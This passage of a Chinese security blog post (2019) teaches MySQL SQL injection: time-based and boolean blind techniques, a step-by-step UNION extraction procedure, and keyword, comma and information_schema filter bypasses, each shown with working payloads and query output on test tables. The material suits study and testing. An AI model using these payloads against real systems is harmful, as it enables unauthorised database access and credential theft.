+<h4 id="配合if条件触发"><a href="#配合if条件触发" class="headerlink" title="配合if条件触发"></a>配合if条件触发</h4><p>if(expr1,expr2,expr3)<br>如果expr1是TRUE(expr1&lt;&gt;0 and expr1&lt;&gt; NULL),则IF()的返回值为expr2；否则返回值是expr3。IF()的返回值为数字或则字符串具体情况视其所在语境而定。</p>
+<p>疑问 </p>
+<pre><code>mysql&gt; select * from user where id = 7 or if(1,1,0);
++----+--------------------------------+----------+
+| id | username                       | password |
++----+--------------------------------+----------+
+|  1 | admin                          | 1234567  |
+|  2 | 012345678901234567890123456789 | 1234567  |
+|  3 | 012345678901234567890123456789 | 1234567  |
+|  4 | admin                          | 11111    |
+|  5 | admin                          | 222222   |
+|  6 | admin                          | 33333    |
++----+--------------------------------+----------+
+6 rows in set (0.00 sec)
+
+mysql&gt; select * from user where id = 1 or if(1,1,0);
++----+--------------------------------+----------+
+| id | username                       | password |
++----+--------------------------------+----------+
+|  1 | admin                          | 1234567  |
+|  2 | 012345678901234567890123456789 | 1234567  |
+|  3 | 012345678901234567890123456789 | 1234567  |
+|  4 | admin                          | 11111    |
+|  5 | admin                          | 222222   |
+|  6 | admin                          | 33333    |
++----+--------------------------------+----------+
+6 rows in set (0.00 sec)</code></pre><p>在不知道字段值的情况下可以通过此种方法得到内容</p>
+<pre><code>mysql&gt; select * from user where username = &#39;&#39; or if(1,1,0);
++----+--------------------------------+----------+
+| id | username                       | password |
++----+--------------------------------+----------+
+|  1 | admin                          | 1234567  |
+|  2 | 012345678901234567890123456789 | 1234567  |
+|  3 | 012345678901234567890123456789 | 1234567  |
+|  4 | admin                          | 11111    |
+|  5 | admin                          | 222222   |
+|  6 | admin                          | 33333    |
++----+--------------------------------+----------+
+6 rows in set (0.00 sec)</code></pre><h5 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h5><p>substr(str,postion,lines) 从str的第postion个字符开始截取lines长度的字符。</p>
+<p>substring(str,FROM pos FOR len),这里可以不使用逗号。这两个函数如果我们不指定长度就会返回从查到的第一个字符开始的剩下所有字符。</p>
+<p>substring_index(str,关键字，关键字出现次数)。返回str满足出现次数的之前的字符(如果第三个参数是负数则倒着来)</p>
+<pre><code>mysql&gt; select * from user where username = &#39;&#39; or if(substr((select username from user where id=1),1,1)=&#39;a&#39;,sleep(2),0);
+Empty set (12.00 sec)</code></pre><p>如果id=1的这条数据第一个字符为’a’，则sleep2s.</p>
+<pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,sleep(2),null);
+Empty set (2.00 sec)</code></pre><p>逐字符查询数据库名。</p>
+<h4 id="配合-case-when…then…else…end-触发"><a href="#配合-case-when…then…else…end-触发" class="headerlink" title="配合 case when…then…else…end 触发"></a>配合 case when…then…else…end 触发</h4><pre><code> select case when username = &#39;admin&#39; then &#39;admin&#39; else &#39;xxx&#39; end from user;
++----------------------------------------------------------+
+| case when username = &#39;admin&#39; then &#39;admin&#39; else &#39;xxx&#39; end |
++----------------------------------------------------------+
+| admin                                                    |
+| xxx                                                      |
+| xxx                                                      |
+| admin                                                    |
+| admin                                                    |
+| admin                                                    |
++----------------------------------------------------------+
+6 rows in set (0.00 sec)</code></pre><h3 id="除了sleep之外的函数"><a href="#除了sleep之外的函数" class="headerlink" title="除了sleep之外的函数"></a>除了sleep之外的函数</h3><h4 id="BENCHMARK-count-expr"><a href="#BENCHMARK-count-expr" class="headerlink" title="BENCHMARK(count,expr)"></a>BENCHMARK(count,expr)</h4><p>BENCHMARK()函数重复count次执行expr。它可以被用于计算MYSQL处理表达式的速度。结果值通常为0。</p>
+<pre><code>select benchmark(10000000,sha(1));</code></pre><p>我们结合上面的语句</p>
+<pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,benchmark(10000000,sha(1)),null);</code></pre><h4 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h4><pre><code> select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C;</code></pre><p>通过计算来延时</p>
+<pre><code>mysql&gt; select count(*) from user;
++----------+
+| count(*) |
++----------+
+|        6 |
++----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select count(*) from user A,user B;
++----------+
+| count(*) |
++----------+
+       36 |
++----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select count(*) from user A,user B,user C;
++----------+
+| count(*) |
++----------+
+|      216 |
++----------+
+1 row in set (0.00 sec)
+
+例如：
+select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.columns C),null);</code></pre><h4 id="GET-LOCK"><a href="#GET-LOCK" class="headerlink" title="GET_LOCK"></a>GET_LOCK</h4><p>GET_LOCK(str,timeout)</p>
+<p>设法使字符串str给定的名字得到一个锁，超时为timeout秒.</p>
+<p>select GET_LOCK(‘a’,1)</p>
+<p>但是上锁后必须在使用长连接能开启两个会话的时候才起作用。</p>
+<h4 id="RLIKE"><a href="#RLIKE" class="headerlink" title="RLIKE"></a>RLIKE</h4><p>通过rpad或repeat 构造长字符串，加以计算量大的pattern，通过repeat的参数控制延时长短。</p>
+<p>   <code>select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;;</code></p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><p>截取函数</p>
+<pre><code>mid(column_name,start[,length])
+mysql&gt; select mid(&#39;abc&#39;,1,1);
++----------------+
+| mid(&#39;abc&#39;,1,1) |
++----------------+
+| a              |
++----------------+
+1 row in set (0.00 sec)
+
+
+left(str,lengt) 从左开始截取字符串
+right(str,length) 从右截取 
+mysql&gt; select right(&#39;abcda&#39;,3);
++------------------+
+| right(&#39;abcda&#39;,3) |
++------------------+
+| cda              |
++------------------+
+1 row in set (0.00 sec)
+
+转ascii类型
+ascii(str)/ord(str)  返回字符串首字母的ascii值</code></pre><p>布尔盲注与时间盲注差别不大</p>
+<p>常用payload </p>
+<pre><code>ascii(substr((select password from user) from 1 for 1))&lt;127</code></pre><h2 id="UNION-联合查询注入"><a href="#UNION-联合查询注入" class="headerlink" title="UNION 联合查询注入"></a>UNION 联合查询注入</h2><p>关于UNION 的用法请参考第一节。</p>
+<p>使用联合查询注入利用的前提是页面有回显位。</p>
+<p>所谓回显位是指在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展现在页面中，这个展示数据的位置就叫回显位。</p>
+<p>联合查询的基本步骤</p>
+<ol>
+<li>找到注入点判断闭合方式</li>
+<li>判断数据库类型</li>
+<li>判断查询列数</li>
+<li>判断回显位</li>
+<li>获取数据库名</li>
+<li>获取表名</li>
+<li>获取字段名</li>
+<li>获取字段中的数据</li>
+</ol>
+<p>ORDER BY子句是基于一个或多个字段按照升序或降序对其中的数据进行排序。一些数据库默认的对查询结果进行升序排序，例如mysql。</p>
+<p>我们可以指定字段名进行排序。这里我们有一张表</p>
+<pre><code>+----+----------+-----+-----------+----------+
+| ID | NAME     | AGE | ADDRESS   | SALARY   |
++----+----------+-----+-----------+----------+
+|  1 | Ramesh   |  32 | Ahmedabad |  2000.00 |
+|  2 | Khilan   |  25 | Delhi     |  1500.00 |
+|  3 | kaushik  |  23 | Kota      |  2000.00 |
+|  4 | Chaitali |  25 | Mumbai    |  6500.00 |
+|  5 | Hardik   |  27 | Bhopal    |  8500.00 |
+|  6 | Komal    |  22 | MP        |  4500.00 |
+|  7 | Muffy    |  24 | Indore    | 10000.00 |
++----+----------+-----+-----------+----------+</code></pre><p>查询语句例如 </p>
+<pre><code>SELECT * FROM CUSTOMERS
+   ORDER BY NAME, SALARY;</code></pre><p>查询结果如下</p>
+<pre><code>+----+----------+-----+-----------+----------+
+| ID | NAME     | AGE | ADDRESS   | SALARY   |
++----+----------+-----+-----------+----------+
+|  4 | Chaitali |  25 | Mumbai    |  6500.00 |
+|  5 | Hardik   |  27 | Bhopal    |  8500.00 |
+|  3 | kaushik  |  23 | Kota      |  2000.00 |
+|  2 | Khilan   |  25 | Delhi     |  1500.00 |
+|  6 | Komal    |  22 | MP        |  4500.00 |
+|  7 | Muffy    |  24 | Indore    | 10000.00 |
+|  1 | Ramesh   |  32 | Ahmedabad |  2000.00 |
++----+----------+-----+-----------+----------+</code></pre><p>同时，我们也可以指定字段的栏位进行排序，第一个字段为1，第二个为2，以此类推。</p>
+<p>这里我们有一张表</p>
+<pre><code>+----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb        |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy      |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious     |
+|  7 | batman   | mob!le      |
+|  8 | admin    | admin       |
+|  9 | admin1   | admin1      |
+| 10 | admin2   | admin2      |
+| 11 | admin3   | admin3      |
+| 12 | dhakkan  | dumbo       |
+| 14 | admin4   | admin4      |
+| 15 | admin#   | 789          |
++----+----------+------------+</code></pre><p>我们使用栏位进行查询</p>
+<pre><code>select * from users order by 3;</code></pre><p>查询结果按照第三栏进行排序</p>
+<pre><code>+----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+| 15 | admin#   | 789         |
+|  8 | admin    | admin       |
+|  9 | admin1   | admin1      |
+| 10 | admin2   | admin2      |
+| 11 | admin3   | admin3      |
+| 14 | admin4   | admin4      |
+|  4 | secure   | crappy      |
+|  1 | Dumb     | Dumb        |
+| 12 | dhakkan  | dumbo       |
+|  6 | superman | genious     |
+|  2 | Angelina | I-kill-you |
+|  7 | batman   | mob!le      |
+|  3 | Dummy    | p@ssword   |
+|  5 | stupid   | stupidity  |
++----+----------+------------+</code></pre><p>如果我们查询一个不存在的栏位呢？</p>
+<pre><code>select * from users order by 4;</code></pre><p>数据库将会报错</p>
+<pre><code>ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;order clause&#39;</code></pre><p>基于此，我们可以利用二分法来对列数进行猜解。</p>
+<p>我们使用UNION来判断回显位，UNION的作用是将两个select查询结果合并</p>
+<pre><code> select id,username from users where id=4 union select 1,2;</code></pre><p>查询结果如下</p>
+<pre><code>+----+----------+
+| id | username |
++----+----------+
+|  4 | secure   |
+|  1 | 2          |
++----+----------+</code></pre><p>在展示数据的时候通常指取结果集的第一行数据，如果我们想取出后半部分的结果，就要使原来的查询查不出结果</p>
+<pre><code>select id,username from users where id=-4 union select 1,2;</code></pre><p>通过查询负数，这样就可以得到我们先要的数据了</p>
+<pre><code>+----+----------+
+| id | username |
++----+----------+
+|  1 | 2        |
++----+----------+</code></pre><p>得到回显位之后，获取数据库名就在回显位使用database()函数</p>
+<pre><code>select id,username from users where id=-4 union select 1,database();</code></pre><p>接下来查询库中所有表名，仍然是在回显位进行查询</p>
+<pre><code>select id,username from users where id=-4 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();</code></pre><p>然后是表中的列名</p>
+<pre><code>select id,username from users where id=-4 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;;</code></pre><p>最后是数据</p>
+<pre><code>select id,username from users where id=-4 union select 1,username from users;</code></pre><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h3><p>对于某些特定关键词过滤比如 from,union,select等我们可以通过双写或大小写混写进行绕过。</p>
+<p>空格绕过： /**/ /*!*/  %09 %0A %0B %0C %0D %A0 %20</p>
+<p>在实际使用中我们也可以使用1个<code>*/</code>来闭合多个<code>/*!</code>.</p>
+<pre><code>SELECT * from users where id = 1/*!union/*!select/*!1,(select/*!password/*!from/*!users/*!limit/*!1,1),3*/;
++----+------------+----------+
+| id | username   | password |
++----+------------+----------+
+|  1 | Dumb         | Dumb      |
+|  1 | I-kill-you | 3         |
++----+------------+----------+</code></pre><p>函数替换：</p>
+<pre><code>mid(&#39;aaa&#39;,1,1) &lt;==&gt; left(&#39;aaa&#39;,1) &lt;==&gt; substr(&#39;aaa&#39;,1,1) &lt;==&gt; substring(&#39;aaa&#39;,1,1)
+
+concat(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;) &lt;==&gt; group\_concat(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;) &lt;==&gt;  concat\_ws(&#39;b&#39;,&#39;a&#39;,&#39;c&#39;)</code></pre><p>逗号绕过：</p>
+<p>union select 联合查询的逗号被过滤时我们可以使用<code>join</code>进行注入</p>
+<pre><code>select * from emails where id = 1.1 union select * from (select 1)a join (select 2)b;</code></pre><p>字符串截取函数中的逗号绕过</p>
+<p>m<code>id(&#39;abc&#39; from 1 for 1) &lt;==&gt; substr(&#39;abc&#39; from 1 for 1) &lt;==&gt; substring(&#39;abc&#39; from 1 for 1)</code></p>
+<p>Limit中逗号绕过</p>
+<pre><code>select * from emails limit 1,1; &lt;==&gt; select * from emails limit 1 offset 1;</code></pre><p><code>=</code>绕过</p>
+<p>可以用like、regexp、rlike、in、between…and…绕过</p>
+<p>比较符绕过<br>！= &lt;==&gt; &lt;&gt;</p>
+<h3 id="关键函数过滤"><a href="#关键函数过滤" class="headerlink" title="关键函数过滤"></a>关键函数过滤</h3><p>如果过滤了<code>information</code>关键字无法使用<code>information_schema.tables</code>等表的话我们可以通过innodb引擎进行注入。 在Mysql5.6以上版本中，系统Mysql库中存在两张与innodb相关的表 <code>innodb_table_stats</code> 和 <code>innodb_index_stats</code>。</p>
+<pre><code>select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();
+
+select group_concat(table_name) from mysql.innodb_index_stats where database_name=database();</code></pre><p>同时我们也可以通过查询一个不存在的自定义函数来获得数据库名</p>
+<pre><code>select * from users where id=haa();
+ERROR 1305 (42000): FUNCTION security.haa does not exist</code></pre><p>爆列名使用<code>polygon</code>和<code>linestring</code>函数。翻阅文档可知</p>
+<blockquote>
+<p>Constructs a Polygon value from a number of LineString or WKB LineString arguments. If any argument does not represent a LinearRing (that is, not a closed and simple LineString), the return value is NULL. </p>
+</blockquote>
+<p>如果我们传入存在字段的话就会爆出库，表，列。</p>
+<pre><code>mysql&gt; select * from users where id=1 and polygon(id);
+ERROR 1367 (22007): Illegal non geometric &#39;`security`.`users`.`id`&#39; value found during parsing
+mysql&gt; select * from users where id=1 and linestring(id);
+ERROR 1367 (22007): Illegal non geometric &#39;`security`.`users`.`id`&#39; value found during parsing</code></pre><p>爆字段名我们通过命名别名的方式。使用别名的时候表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错，从而爆出字段名，再使用<code>using</code>函数以此爆出其他字段名。</p>
+<pre><code>mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b)as c);
+ERROR 1060 (42S21): Duplicate column name &#39;id&#39;
+mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id))as c);
+ERROR 1060 (42S21): Duplicate column name &#39;username&#39;
+mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username))as c);
+ERROR 1060 (42S21): Duplicate column name &#39;password&#39;
+mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username,password))as c);
+ERROR 1241 (21000): Operand should contain 1 column(s)</code></pre><p>如果过滤了字段名，比如 password 我们可以通过以下方法得到数据</p>
+<pre><code>mysql&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e;
+
++------------+
+| 3           |
++------------+
+| 3           |
+| Dumb        |
+| I-kill-you |
+| p@ssword   |
+| crappy      |
+| stupidity  |
+| genious     |
+| mob!le      |
+| admin       |
+| admin1      |
+| admin2      |
+| admin3      |
+| dumbo       |
+| admin4      |
+| 789          |
++------------+
+
+mysql&gt; select * from users where id=1 union select 1,(select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e limit 1 offset 2),3;
+
++----+------------+----------+
+| id | username   | password |
++----+------------+----------+
+|  1 | Dumb         | Dumb      |
+|  1 | I-kill-you | 3         |
++----+------------+----------+</code></pre><p>原理是通过建立虚表e，虚表e里的第三列储存了password字段信息，我们通过偏移来使该字段信息显示在没被过滤的username字段中。</p>
+<p>还有一种方法是盲注</p>
+<p>现在我们的表里有一条数据</p>
+<pre><code>mysql&gt; select * from users where id=15;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+| 15 | admin#   | 789  |
++----+----------+----------+</code></pre><p>我们通过盲注的方式进行查询。</p>
+<pre><code>mysql&gt; select * from users where id=15 union select 1,2,0x38 order by 3 desc;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | 2        | 8        |
+| 15 | admin#   | 789      |
++----+----------+----------+
+2 rows in set (0.00 sec)    
+
+mysql&gt; select * from users where id=15 union select 1,2,0x37 order by 3 desc;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+| 15 | admin#   | 789  |
+|  1 | 2| 7|
++----+----------+----------+
+2 rows in set (0.00 sec)
+
+mysql&gt; select * from users where id=15 union select 1,2,0x36 order by 3 desc;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+| 15 | admin#   | 789      |
+|  1 | 2        | 6        |
++----+----------+----------+
+2 rows in set (0.00 sec)</code></pre><p>order by 3 desc 表示对第三栏进行降序排列。而mysql在比较的时候是从左到右按照字符的ASCII码来比较。</p>
+<p>从结果我们可以看出union select 0x38 时username 回显2,union select 0x37 时username 回显 admin#,union select 0x36时 username 回显admin#,也就是说password的第一位是0x37，也就是7.于是，我们可以通过写脚本来爆破这个位置的值。</p>
+<p>参考链接</p>
+<blockquote>
+<p><a href="https://www.secpulse.com/archives/68991.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/68991.html</a></p>
+<p><a href="https://xz.aliyun.com/t/5505#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5505#toc-3</a></p>
+<p><a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p>
+<p><a href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/" target="_blank" rel="noopener">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p>
+</blockquote>
+<ul>
+<li>union select：堆叠注入</li>
+<li>注释符过滤 让最后查询语句最后一个字符为数字即<code>id=1&#39; or &#39;1</code></li>
+<li>and or ^ | &amp; 相互转换</li>
+<li>获取当前数据库  1’ adn asdf();</li>
+</ul>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 brainsemail@163.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a href="javascript:void(0)" class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>SQL</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="Luc1fer">Luc1fer</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-07-28, 15:13:47</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-01, 19:53:27</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/07/28/SQL/" title="SQL">https://github.com/BrainLyh/2019/07/28/SQL/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2016-2019 Yelog</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" href="javascript:void(0)"></a>
+    </div>
+</div>
+<div class="acParent"></div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="//cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#WP','#比赛回顾','#工具','#渗透测试','#LSB','#MISC','#隐写','#RSA','#serialize','#php','#SQL','#哈希长度扩展攻击',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        background: url("http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kej6ap1bj31hc0u0wn6.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
